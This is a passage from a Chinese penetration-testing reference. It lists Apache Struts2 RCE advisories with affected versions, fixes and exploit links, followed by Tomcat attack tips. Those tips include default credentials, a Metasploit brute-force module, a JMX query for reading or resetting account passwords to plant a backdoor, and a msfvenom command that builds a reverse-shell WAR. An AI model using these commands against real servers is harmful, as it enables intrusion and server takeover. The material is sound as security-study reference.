- [shengqi158/S2-055-PoC](https://github.com/shengqi158/S2-055-PoC) - S2-055的环境，基于rest-show-case改造
**相关文章**
- [Struts2 历史 RCE 漏洞回顾不完全系列](http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/)
- [struts2绕过waf读写文件及另类方式执行命令](https://f0ng.github.io/2022/04/14/struts2%E7%BB%95%E8%BF%87waf%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E5%8F%8A%E5%8F%A6%E7%B1%BB%E6%96%B9%E5%BC%8F%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/)
**S2-016 & CVE-2013-2251**
- https://cwiki.apache.org/confluence/display/WW/S2-016
- 描述
    DefaultActionMapper 类支持以"action:"、"redirect:"、"redirectAction:"作为导航或是重定向前缀，但是这些前缀后面同时可以跟 OGNL 表达式，由于 struts2 没有对这些前缀做过滤，导致利用 OGNL 表达式调用 java 静态方法执行任意系统命令
- 影响版本
    - Struts 2.0.0 ~ 2.3.15
- POC | Payload | exp
    - [OneSourceCat/s2-016-exp](https://github.com/OneSourceCat/s2-016-exp)
**S2-020 & CVE-2014-0094 & CNNVD-201403-191**
- https://cwiki.apache.org/confluence/display/WW/S2-020
- 描述
    Apache Struts 2.0.0-2.3.16 版本的默认上传机制是基于 Commons FileUpload 1.3 版本，其附加的 ParametersInterceptor 允许访问'class' 参数（该参数直接映射到 `getClass()` 方法），并允许控制 ClassLoader。在具体的 Web 容器部署环境下（如：Tomcat），攻击者利用 Web 容器下的 Java Class 对象及其属性参数（如：日志存储参数），可向服务器发起远程代码执行攻击，进而植入网站后门控制网站服务器主机。
- 影响版本
    - Struts 2.0.0 ~ 2.3.16.1
- 相关文章
    - [Struts2 S2-020在Tomcat 8下的命令执行分析](https://www.freebuf.com/articles/web/31039.html)
- POC | Payload | exp
    - https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/Struts2/S2-020_POC.py
**S2-045 & CVE-2017-5638**
- https://cwiki.apache.org/confluence/display/WW/S2-045
- 描述
    恶意用户可在上传文件时通过修改 HTTP 请求头中的 Content-Type 值来触发该漏洞进而执行系统命令.
- 影响版本
    - Struts 2.3.5 ~ 2.3.31
    - Struts 2.5 ~ 2.5.10
- POC | Payload | exp
    - [tengzhangchao/Struts2_045-Poc](https://github.com/tengzhangchao/Struts2_045-Poc)
    - [iBearcat/S2-045](https://github.com/iBearcat/S2-045)
**S2-046 & CVE-2017-5638**
- https://cwiki.apache.org/confluence/display/WW/S2-046
- 描述
    该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息,导致远程攻击者可通过修改 HTTP 请求头中的 Content-Type 值,构造发送恶意的数据包,利用该漏洞进而在受影响服务器上执行任意系统命令.
- 影响版本
    - Struts 2.3.5 ~ 2.3.31
    - Struts 2.5 ~ 2.5.10
- 修复方案
    1. 官方已经发布版本更新,尽快升级到不受影响的版本(Struts 2.3.32 或 Struts 2.5.10.1),建议在升级前做好数据备份.
    2. 临时修复方案
    在用户不便进行升级的情况下,作为临时的解决方案,用户可以进行以下操作来规避风险:在 WEB-INF/classes 目录下的 struts.xml 中的 struts 标签下添加
    ``
    在 WEB-INF/classes/ 目录下添加 global.properties,文件内容如下:
    `struts.messages.upload.error.InvalidContentTypeException=1`
- POC | Payload | exp
    - [mazen160/struts-pwn](https://github.com/mazen160/struts-pwn)
**S2-048 & CVE-2017-9791**
- https://cwiki.apache.org/confluence/display/WW/S2-048
- 描述
    攻击者可以构造恶意的字段值通过 Struts2 的 struts2-struts1-plugin 插件，远程执行代码。
- 影响版本
    - Struts 2.1.x ~ 2.3.x
- POC | Payload | exp
    - [dragoneeg/Struts2-048](https://github.com/dragoneeg/Struts2-048)
**S2-052 & CVE-2017-9805**
- https://cwiki.apache.org/confluence/display/WW/S2-052
- 描述
    启用 Struts REST 插件并使用 XStream 组件对 XML 进行反序列操作时，未对数据内容进行有效验证，可被攻击者进行远程代码执行攻击(RCE)。
- 影响版本
    - Struts 2.1.6 ~ 2.3.33
    - Struts 2.5 ~ 2.5.12
- POC | Payload | exp
    - [mazen160/struts-pwn_CVE-2017-9805](https://github.com/mazen160/struts-pwn_CVE-2017-9805)
**S2-053 & CVE-2017-12611**
- https://cwiki.apache.org/confluence/display/WW/S2-053
- 描述
    当开发者在 Freemarker 标签中使用如下代码时 `` Freemarker 会将值当做表达式进行执行，最后导致代码执行。
- 影响版本
    - Struts 2.0.0 ~ 2.3.33
    - Struts 2.5 ~ 2.5.10.1
- POC | Payload | exp
    - [brianwrf/S2-053-CVE-2017-12611](https://github.com/brianwrf/S2-053-CVE-2017-12611)
**S2-055 & CVE-2017-7525**
- https://cwiki.apache.org/confluence/display/WW/S2-055
- 描述
    2017年12月1日，Apache Struts 发布最新的安全公告，Apache Struts 2.5.x REST 插件存在远程代码执行的中危漏洞，漏洞编号与 CVE-2017-7525 相关。漏洞的成因是由于使用的 Jackson 版本过低在进行 JSON 反序列化的时候没有任何类型过滤导致远程代码执行。。
- 影响版本
    - Struts 2.5 ~ 2.5.14
- POC | Payload | exp
    - [iBearcat/S2-055](https://github.com/iBearcat/S2-055)
**S2-056 & CVE-2018-1327**
- https://cwiki.apache.org/confluence/display/WW/S2-056
- 描述
    S2-056 漏洞发生于 Apache Struts 2的 REST 插件，当使用 XStream 组件对 XML 格式的数据包进行反序列化操作，且未对数据内容进行有效验证时，攻击者可通过提交恶意 XML 数据对应用进行远程 DoS 攻击。
- 影响版本
    - Struts 2.1.1 ~ 2.5.14.1
- POC | Payload | exp
    - [ iBearcat/S2-056-XStream](https://github.com/iBearcat/S2-056-XStream)
**S2-057 & CVE-2018-11776**
- https://cwiki.apache.org/confluence/display/WW/S2-057
- 描述
    该漏洞由 Semmle Security Research team 的安全研究员 Man YueMo 发现.该漏洞是由于在 Struts2 开发框架中使用 namespace 功能定义 XML 配置时,namespace 值未被设置且在上层动作配置(Action Configuration)中未设置或用通配符 namespace,可能导致远程代码执行.
- 影响版本
    - Struts 2.0.4 ~ 2.3.34
    - Struts 2.5.0 ~ 2.5.16
- POC | Payload | exp
    - [Ivan1ee/struts2-057-exp](https://github.com/Ivan1ee/struts2-057-exp)
    - [mazen160/struts-pwn_CVE-2018-11776](https://github.com/mazen160/struts-pwn_CVE-2018-11776)
**S2-059 & CVE-2019-0230**
- https://cwiki.apache.org/confluence/display/WW/S2-059
- 描述
    Apache Struts 框架, 会对某些特定的标签的属性值，比如 id 属性进行二次解析，所以攻击者可以传递将在呈现标签属性时再次解析的 OGNL 表达式，造成 OGNL 表达式注入。从而可能造成远程执行代码。
- 影响版本
    - Struts 2.0.0 ~ 2.5.20
- 相关文章
    - [Struts2 S2-059 漏洞分析](https://paper.seebug.org/1302/)
    - [CVE-2019-0230 s2-059 漏洞分析](https://www.cnblogs.com/ph4nt0mer/p/13512599.html)
- POC | Payload | exp
    - [Struts2 S2-059 远程代码执行漏洞(CVE-2019-0230)](https://github.com/vulhub/vulhub/blob/master/struts2/s2-059/README.zh-cn.md)
    - [ramoncjs3/CVE-2019-0230](https://github.com/ramoncjs3/CVE-2019-0230)
**S2-061 & CVE-2020-17530**
- https://cwiki.apache.org/confluence/display/WW/S2-061
- 描述
    S2-061 是对 S2-059 的绕过，Struts2 官方对 S2-059 的修复方式是加强 OGNL 表达式沙盒，而 S2-061 绕过了该沙盒。该漏洞影响版本范围是 Struts 2.0.0 到 Struts 2.5.25。
- 相关文章
    - [Struts2 S2-061漏洞分析(CVE-2020-17530)](https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g)
    - [Struts2 s2-061 Poc分析](https://mp.weixin.qq.com/s/skV6BsARvie33vV2R6SZKw)
    - [内含POC丨漏洞复现之S2-061（CVE-2020-17530）](https://www.anquanke.com/post/id/225252)
- POC | Payload | exp
    - [Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）](https://github.com/vulhub/vulhub/blob/master/struts2/s2-061/README.zh-cn.md)
    - [vilPulsar/S2-061](https://github.com/EvilPulsar/S2-061)
---
### Tapestry
**CVE-2021-27850**
- 相关文章
    - [tapestry 未授权远程命令执行漏洞复现](https://mp.weixin.qq.com/s/TUvtQuJo3s4Vudf0srQZLA)
- POC | Payload | exp
    - [kahla-sec/CVE-2021-27850_POC](https://github.com/kahla-sec/CVE-2021-27850_POC)
---
### Tomcat
> 官网 : https://tomcat.apache.org/
Tomcat 默认端口为 8080,也可能被改为其他端口,后台管理路径为 `/manager/html`,后台默认弱口令 admin/admin、tomcat/tomcat 等,若果配置不当,可通过"Tomcat Manager"连接部署 war 包的方式获取 webshell.
**搭建教程**
- [Tomcat 搭建](../../../Integrated/Linux/Power-Linux.md#Tomcat)
**相关文章**
- [Tomcat漏洞详解](http://www.mottoin.com/detail/389.html)
- [渗透测试-Tomcat常见漏洞总结](https://mp.weixin.qq.com/s/ZXoCJ9GhMaTvVFeYn8vMUA)
- [Tomcat URL解析差异性导致的安全问题](https://xz.aliyun.com/t/7544)
- [不安全的中间件-Tomcat](https://mp.weixin.qq.com/s/MmLhJ2EbvmuJx2YTSeeTyQ)
**Tips**
- tomcat5 默认有两个角色：tomcat 和 role1。其中账号 both、tomcat、role1 的默认密码都是 tomcat。不过不具备部署应用的权限，默认需要 manager 权限才能够直接部署 war 包.
- tomcat6 默认没有配置任何用户以及角色，没办法用默认账号登录.
- tomcat7 与6类似
- tomcat8 其实从6开始，tomcat 就将默认的用户去掉了
- 控制台路径
    - `/manager/status`
    - `/manager/html`
    - `/host-manager/`
- `jar -cf job.war ./job.jsp` 生成 war 包
- 如果应用存在 lfi,可以配合以下几点进一步挖掘信息:
    - web应用的配置文件可能在 `/webapps/[web应用名]/WEB-INF/classes/` 目录下, xxx.properties 后缀的文件。
        - properties 字典 : https://github.com/ffffffff0x/AboutSecurity/blob/master/Payload/LFI/Fuzz_properties.txt
    - tomcat 配置 /Conf/tomcat-users.xml
**爆破 Manager APP**
Manager 管理平台我们都很熟悉，也是最常见的，包含多个管理模块，开启后方便开发及运维人员对 tomcat 项目发布进行管理。Manager 管理平台默认安装后是没有设置登录口令的，需要在 tomcat-user.xml 文件中进行配置，与上文的 admin 管理平台相同。
在登录 manager 后台时，tomcat 使用的是 Basic 认证方式，在请求的数据包中包含一个 Authorization 字段，该字段的值为账号密码的 base64 编码，口令形式为 username:password
![](../../../../assets/img/Security/RedTeam/Web安全/BS-Exploits/2.png)
- http://user:PI:EMAIL:xxx/manager/html
- MSF Module
    ```
    use auxiliary/scanner/http/tomcat_mgr_login
    ```
Tomcat manager 包含 4 个不同的角色：
- manager-gui：允许访问 html 页面接口 (即 URL 路径为 / manager/html/*)
- manager-script：允许访问纯文本接口 (即 URL 路径为 / manager/text/*)
- manager-jmx：允许访问 JMX 代理接口 (即 URL 路径为 / manager/jmxproxy/*)
- manager-status：允许访问 Tomcat 只读状态页面 (即 URL 路径为 / manager/status/*)
其中 manager-gui、manager-script、manager-jmx 三个角色均具备 manager-status 角色的权限，即这三种角色权限无需再额外添加 manager-status 权限。实际使用中只需配置 manager-gui 角色通过 html 页面的形式访问管理平台。
**manager-jmx**
Tomcat 使用 JMX 管理方式，在 Tomcat 的自带应用 manager 就是使用了 JMX 方式来管理 Tomcat，以此完成 Web 应用的动态部署、启动、停止。在 tomcat 的帮助文档中，提供了下面几种方式发送请求获取相应的信息：
- query 命令：http://[ip]:[port]/manager/jmxproxy/?qry=
- get 命令：http:// [ip]:[port]/manager/jmxproxy/?get=
- set 命令：http:// [ip]:[port]/manager/jmxproxy/?set=
- invoke 命令：http:// [ip]:[port]/manager/jmxproxy/?invoke=
访问上面的地址，我们就可以看到不同的信息，通过向不同的参数传递特定的参数，也可以获取到一些敏感信息。不加参数时查询到的是所有的 MBeans 的内容，加参数之后就可以查看到具体的 MBeans 的内容。
例如： http://[ip]:[port]/manager/jmxproxy/?qry=\*%3atype=User%2c\*
该查询可以看到设置的 tomcat-user.xml 中配置的账号密码，甚至还可以通过 set 命令修改账号密码，来设置一个后门账号。
**War**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file
```
**样例目录 session 操纵漏洞**
Tomcat 在安装部署后，在 webapps 默认存在一个 examples 目录，该目录正如其文件名一样，提供一些示例应用让使用者来了解 Tomcat 的特性及功能。这些样例在业务上线后并没有什么用处，建议部署 tomcat 后，删除其中的样例文件（ROOT, balancer,jsp-examples, servlet-examples, tomcat-docs, webdav），避免信息泄露和其他潜在的安全风险。
这些样例中的 session 样例（/examples/servlets/servlet/SessionExample）允许用户对 session 进行操纵，因为 session 是全局通用的，所以用户可以通过操纵 session 获取管理员权限，存在一定的安全风险，不过这种基本上只有在一些比较老的不安全系统中才有可能出现，利用条件比较苛刻。
- 相关文章
    - [Apache Tomcat样例目录session操纵漏洞](https://blog.51cto.com/chenjc/1434858)
**CVE-2016-1240**
- 描述
    10月1日,Tomcat 爆出了一个本地提权漏洞。通过该漏洞,攻击者可以通过一个低权限的 Tomcat 用户获得系统的 root 权限。
- 影响版本